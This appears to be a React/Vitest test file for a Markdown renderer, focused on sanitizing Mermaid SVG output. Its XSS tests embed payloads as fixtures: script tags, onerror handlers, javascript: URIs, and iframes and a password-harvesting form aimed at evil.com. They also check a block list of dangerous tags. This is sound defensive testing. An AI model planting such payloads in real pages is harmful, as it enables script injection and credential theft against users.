import { render, screen, waitFor } from '@testing-library/react';
import { beforeEach,describe, expect, it, vi } from 'vitest';

// Capture mermaid.initialize config outside mock lifecycle so it survives clearAllMocks.
// The MarkdownRenderer singleton calls initialize only once per module load.
const initializeConfigs: unknown[] = [];

const mocks = vi.hoisted(() => ({
  mermaidRender: vi.fn(),
  mermaidInitialize: vi.fn(),
}));

vi.mock('mermaid', () => ({
  default: {
    initialize: (...args: unknown[]) => {
      initializeConfigs.push(args[0]);
      return mocks.mermaidInitialize(...args);
    },
    render: mocks.mermaidRender,
  },
}));

import { RenderedMarkdown, SVG_SANITIZE_CONFIG } from '../../../src/components/MarkdownRenderer';

describe('RenderedMarkdown', () => {
  beforeEach(() => {
    vi.clearAllMocks();
  });

  it('renders basic markdown', () => {
    render(<RenderedMarkdown content="# Hello World" />);
    expect(screen.getByRole('heading', { name: 'Hello World' })).toBeInTheDocument();
  });

  it('applies max-width 900px and centers content', () => {
    render(<RenderedMarkdown content="Some text" />);
    const container = screen.getByTestId('rendered-markdown');
    expect(container.className).toContain('max-w-[900px]');
    expect(container.className).toContain('mx-auto');
  });

  it('allows style overrides', () => {
    render(<RenderedMarkdown content="Text" style={{ padding: '32px' }} />);
    const container = screen.getByTestId('rendered-markdown');
    expect(container.style.padding).toBe('32px');
  });

  it('renders syntax-highlighted code blocks', () => {
    const content = '```typescript\nconst x = 1;\n```';
    render(<RenderedMarkdown content={content} />);
    expect(screen.getByText('const')).toBeInTheDocument();
  });

  it('renders mermaid code blocks as diagrams', async () => {
    const svgOutput = '<svg data-testid="mock-svg"><text>Mock Diagram</text></svg>';
    mocks.mermaidRender.mockResolvedValue({ svg: svgOutput });

    const content = '```mermaid\ngraph TD\n  A-->B\n```';
    render(<RenderedMarkdown content={content} />);

    await waitFor(() => {
      const diagram = screen.getByTestId('mermaid-diagram');
      expect(diagram.innerHTML).toContain('Mock Diagram');
    });

    expect(mocks.mermaidRender).toHaveBeenCalledWith(
      expect.stringContaining('mermaid-'),
      'graph TD\n  A-->B',
    );
  });

  it('shows error state when mermaid rendering fails', async () => {
    mocks.mermaidRender.mockRejectedValue(new Error('Invalid syntax'));

    const content = '```mermaid\ninvalid diagram\n```';
    render(<RenderedMarkdown content={content} />);

    await waitFor(() => {
      expect(screen.getByText('Mermaid diagram error')).toBeInTheDocument();
      expect(screen.getByText('Invalid syntax')).toBeInTheDocument();
    });
  });

  it('does not wrap mermaid diagrams in a <pre> tag', async () => {
    const svgOutput = '<svg><text>Diagram</text></svg>';
    mocks.mermaidRender.mockResolvedValue({ svg: svgOutput });

    const content = '```mermaid\ngraph TD\n  A-->B\n```';
    render(<RenderedMarkdown content={content} />);

    await waitFor(() => {
      const diagram = screen.getByTestId('mermaid-diagram');
      expect(diagram.innerHTML).toContain('Diagram');
      // The mermaid div must NOT be inside a <pre> element
      expect(diagram.closest('pre')).toBeNull();
    });
  });

  it('renders inline code without mermaid treatment', () => {
    render(<RenderedMarkdown content="Use `graph TD` for diagrams" />);
    expect(screen.getByText('graph TD')).toBeInTheDocument();
    expect(mocks.mermaidRender).not.toHaveBeenCalled();
  });

  it('renders GFM tables', () => {
    const content = '| A | B |\n|---|---|\n| 1 | 2 |';
    render(<RenderedMarkdown content={content} />);
    expect(screen.getByText('A')).toBeInTheDocument();
    expect(screen.getByText('1')).toBeInTheDocument();
  });

  describe('Mermaid XSS sanitization', () => {
    const MERMAID_BLOCK = '```mermaid\ngraph TD\n  A-->B\n```';

    /** Render a mermaid block with the given SVG and return the diagram's innerHTML. */
    async function renderMermaidSvg(svg: string): Promise<string> {
      mocks.mermaidRender.mockResolvedValue({ svg });
      render(<RenderedMarkdown content={MERMAID_BLOCK} />);
      let html = '';
      await waitFor(() => {
        const diagram = screen.getByTestId('mermaid-diagram');
        expect(diagram.innerHTML).not.toBe('');
        html = diagram.innerHTML;
      });
      return html;
    }

    it('strips <script> tags from SVG output', async () => {
      const html = await renderMermaidSvg('<svg><text>Diagram</text><script>alert("xss")</script></svg>');
      expect(html).toContain('Diagram');
      expect(html).not.toContain('<script>');
      expect(html).not.toContain('alert');
    });

    it('strips event handler attributes from SVG output', async () => {
      const html = await renderMermaidSvg('<svg><rect onclick="alert(1)" onerror="alert(2)" width="100" height="100"/><text>Safe</text></svg>');
      expect(html).toContain('Safe');
      expect(html).not.toContain('onclick');
      expect(html).not.toContain('onerror');
      expect(html).not.toContain('alert');
    });

    it('strips javascript: URIs from SVG output', async () => {
      const html = await renderMermaidSvg('<svg><a href="javascript:alert(1)"><text>Click me</text></a></svg>');
      expect(html).toContain('Click me');
      expect(html).not.toContain('javascript:');
    });

    it('strips <use> elements with external references', async () => {
      const html = await renderMermaidSvg('<svg><use href="http://evil.com/evil.svg#xss"/><text>Safe</text></svg>');
      expect(html).toContain('Safe');
      expect(html).not.toContain('evil.com');
    });

    it('preserves foreignObject with safe Mermaid label content', async () => {
      const html = await renderMermaidSvg(
        '<svg><foreignObject width="100" height="40"><div xmlns="http://www.w3.org/1999/xhtml"><span class="nodeLabel">Node A</span></div></foreignObject></svg>',
      );
      expect(html).toContain('Node A');
      expect(html).toContain('foreignObject');
      expect(html).toContain('nodeLabel');
    });

    it('strips dangerous HTML inside foreignObject (img+onerror, script)', async () => {
      const html = await renderMermaidSvg(
        '<svg><foreignObject><div><img src="x" onerror="alert(1)"/><script>alert(2)</script><span>Safe Label</span></div></foreignObject></svg>',
      );
      expect(html).toContain('Safe Label');
      expect(html).toContain('foreignObject');
      expect(html).not.toContain('<img');
      expect(html).not.toContain('onerror');
      expect(html).not.toContain('<script');
      expect(html).not.toContain('alert');
    });

    it('strips iframe and object elements inside foreignObject', async () => {
      const html = await renderMermaidSvg(
        '<svg><foreignObject><div><iframe src="https://evil.com/"></iframe><object data="https://evil.com/evil.swf"></object><span>Safe content</span></div></foreignObject></svg>',
      );
      expect(html).toContain('Safe content');
      expect(html).toContain('foreignObject');
      expect(html).not.toContain('<iframe');
      expect(html).not.toContain('<object');
      expect(html).not.toContain('evil.com');
    });

    it('strips form and input elements inside foreignObject', async () => {
      const html = await renderMermaidSvg(
        '<svg><foreignObject><div><form action="https://evil.com/harvest"><input type="password" name="pw"/></form><span>Node Label</span></div></foreignObject></svg>',
      );
      expect(html).toContain('Node Label');
      expect(html).not.toContain('<form');
      expect(html).not.toContain('<input');
      expect(html).not.toContain('evil.com');
    });

    it('preserves multiple foreignObject elements in one SVG (multi-node flowchart)', async () => {
      const html = await renderMermaidSvg([
        '<svg>',
        '<foreignObject width="100" height="40"><div xmlns="http://www.w3.org/1999/xhtml"><span class="nodeLabel">Node A</span></div></foreignObject>',
        '<foreignObject width="100" height="40"><div xmlns="http://www.w3.org/1999/xhtml"><span class="nodeLabel">Node B</span></div></foreignObject>',
        '<foreignObject width="100" height="40"><div xmlns="http://www.w3.org/1999/xhtml"><span class="nodeLabel">Node C</span></div></foreignObject>',
        '</svg>',
      ].join(''));
      expect(html).toContain('Node A');
      expect(html).toContain('Node B');
      expect(html).toContain('Node C');
      expect((html.match(/foreignObject/gi) ?? []).length).toBeGreaterThanOrEqual(3);
    });

    it('strips nested foreignObject elements', async () => {
      const html = await renderMermaidSvg([
        '<svg><foreignObject width="100" height="40">',
        '<div xmlns="http://www.w3.org/1999/xhtml"><span>Outer label</span>',
        '<foreignObject width="50" height="20"><div><script>alert(1)</script></div></foreignObject>',
        '</div></foreignObject></svg>',
      ].join(''));
      expect(html).toContain('Outer label');
      expect(html).not.toContain('<script');
      expect(html).not.toContain('alert');
    });

    it('preserves valid SVG content through sanitization', async () => {
      const html = await renderMermaidSvg(
        '<svg xmlns="http://www.w3.org/2000/svg" viewBox="0 0 100 100"><rect x="10" y="10" width="80" height="80" fill="#1a3a32" stroke="#29423b"/><text x="50" y="55" text-anchor="middle" fill="#e6f2ee">Node A</text></svg>',
      );
      expect(html).toContain('Node A');
      expect(html).toContain('<rect');
      expect(html).toContain('<text');
      expect(html).toContain('fill="#1a3a32"');
    });

    it('preserves sequence diagram SVG using text elements (no foreignObject)', async () => {
      const html = await renderMermaidSvg([
        '<svg xmlns="http://www.w3.org/2000/svg" viewBox="0 0 400 300">',
        '<rect x="50" y="10" width="120" height="40" fill="#1a3a32" stroke="#29423b"/>',
        '<text x="110" y="35" text-anchor="middle" fill="#e6f2ee">Alice</text>',
        '<rect x="250" y="10" width="120" height="40" fill="#1a3a32" stroke="#29423b"/>',
        '<text x="310" y="35" text-anchor="middle" fill="#e6f2ee">Bob</text>',
        '<line x1="110" y1="50" x2="310" y2="80" stroke="#9fb7ae"/>',
        '<text x="210" y="70" text-anchor="middle" fill="#e6f2ee">Hello</text>',
        '</svg>',
      ].join(''));
      expect(html).toContain('Alice');
      expect(html).toContain('Bob');
      expect(html).toContain('Hello');
      expect(html).toContain('<text');
      expect(html).toContain('<line');
    });

    it('uses explicit ALLOWED_TAGS, ADD_TAGS, and ALLOWED_ATTR in SVG sanitize config', () => {
      // Verify the config has explicit allowlists (defense-in-depth)
      expect(SVG_SANITIZE_CONFIG.ALLOWED_TAGS).toBeDefined();
      expect(SVG_SANITIZE_CONFIG.ALLOWED_TAGS!.length).toBeGreaterThan(10);
      expect(SVG_SANITIZE_CONFIG.ALLOWED_ATTR).toBeDefined();
      expect(SVG_SANITIZE_CONFIG.ALLOWED_ATTR!.length).toBeGreaterThan(10);

      // Dangerous tags must NOT be in any allowlist
      const allAllowedTags = [...SVG_SANITIZE_CONFIG.ALLOWED_TAGS!, ...SVG_SANITIZE_CONFIG.ADD_TAGS!];
      const blockedTags = ['script', 'iframe', 'object', 'embed', 'form', 'input', 'textarea', 'img'];
      for (const tag of blockedTags) {
        expect(allAllowedTags).not.toContain(tag);
      }

      // Event handler attributes must NOT be in the allowlist
      const blockedAttrs = ['onclick', 'onerror', 'onload', 'onmouseover', 'onfocus'];
      for (const attr of blockedAttrs) {
        expect(SVG_SANITIZE_CONFIG.ALLOWED_ATTR).not.toContain(attr);
      }

      // Core SVG tags must be in ALLOWED_TAGS
      const requiredSvgTags = ['svg', 'g', 'path', 'rect', 'text', 'tspan', 'defs', 'style', 'marker'];
      for (const tag of requiredSvgTags) {
        expect(SVG_SANITIZE_CONFIG.ALLOWED_TAGS).toContain(tag);
      }

      // foreignObject and HTML elements must be in ADD_TAGS (extends SVG profile)
      // Note: jsdom normalizes SVG tag names to lowercase at runtime
      const addTagsLower = SVG_SANITIZE_CONFIG.ADD_TAGS!.map((t: string) => t.toLowerCase());
      // All five tags that Mermaid v11 generates inside foreignObject must be present
      const requiredAddTags = ['foreignobject', 'div', 'span', 'p', 'br'];
      for (const tag of requiredAddTags) {
        expect(addTagsLower).toContain(tag);
      }

      // HTML_INTEGRATION_POINTS must include both foreignobject (SVG→HTML bridge)
      // and annotation-xml (MathML→HTML bridge) for namespace bridging
      expect(SVG_SANITIZE_CONFIG.HTML_INTEGRATION_POINTS).toBeDefined();
      const integrationPoints = SVG_SANITIZE_CONFIG.HTML_INTEGRATION_POINTS as Record<string, unknown>;
      expect(integrationPoints).toHaveProperty('foreignobject', true);
      expect(integrationPoints).toHaveProperty('annotation-xml', true);
    });

    it('preserves complex Mermaid SVG with gradients, markers, and filters', async () => {
      const complexSvg = [
        '<svg xmlns="http://www.w3.org/2000/svg" viewBox="0 0 200 200">',
        '<defs>',
        '<linearGradient id="grad1"><stop offset="0%" stop-color="#1a3a32"/><stop offset="100%" stop-color="#29423b"/></linearGradient>',
        '<marker id="arrow" markerWidth="10" markerHeight="7" refX="10" refY="3.5" orient="auto"><polygon points="0 0, 10 3.5, 0 7" fill="#9fb7ae"/></marker>',
        '</defs>',
        '<g transform="translate(10,10)">',
        '<rect x="0" y="0" width="80" height="40" fill="url(#grad1)" stroke="#29423b" rx="5"/>',
        '<text x="40" y="25" text-anchor="middle" font-size="14" fill="#e6f2ee">Node</text>',
        '<line x1="40" y1="40" x2="40" y2="80" stroke="#9fb7ae" marker-end="url(#arrow)"/>',
        '</g>',
        '</svg>',
      ].join('');
      mocks.mermaidRender.mockResolvedValue({ svg: complexSvg });

      render(<RenderedMarkdown content={MERMAID_BLOCK} />);

      await waitFor(() => {
        const diagram = screen.getByTestId('mermaid-diagram');
        expect(diagram.innerHTML).toContain('<linearGradient');
        expect(diagram.innerHTML).toContain('<marker');
        expect(diagram.innerHTML).toContain('<polygon');
        expect(diagram.innerHTML).toContain('text-anchor');
        expect(diagram.innerHTML).toContain('transform=');
        expect(diagram.innerHTML).toContain('Node');
      });
    });

    it('calls mermaid.initialize with securityLevel strict', () => {
      // The singleton ensureMermaidInit() fires once per module load during
      // the first mermaid render in this suite. We capture config args outside
      // the mock lifecycle (survives clearAllMocks) to assert on them here.
      const hasStrictCall = initializeConfigs.some(
        (config) =>
          config &&
          typeof config === 'object' &&
          (config as Record<string, unknown>).securityLevel === 'strict',
      );
      expect(hasStrictCall).toBe(true);
    });
  });
});
